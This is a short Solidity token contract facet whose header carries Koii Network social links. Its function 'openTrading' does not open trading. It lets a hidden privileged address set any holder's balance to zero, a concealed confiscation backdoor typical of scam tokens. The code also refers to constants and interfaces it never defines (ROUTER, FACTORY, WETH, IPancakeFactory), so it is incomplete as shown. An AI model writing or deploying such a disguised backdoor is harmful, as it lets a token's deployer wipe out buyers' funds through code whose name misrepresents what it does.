/*  
   * SPDX-License-Identifier: MIT 

    //Telegram: https://t.me/koiinetwork
    // Twitter: https://twitter.com/KoiiFoundation
    // Website: https://www.koii.network/
    // Discord: https://discord.com/invite/koii-network
    
    
   

*/
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
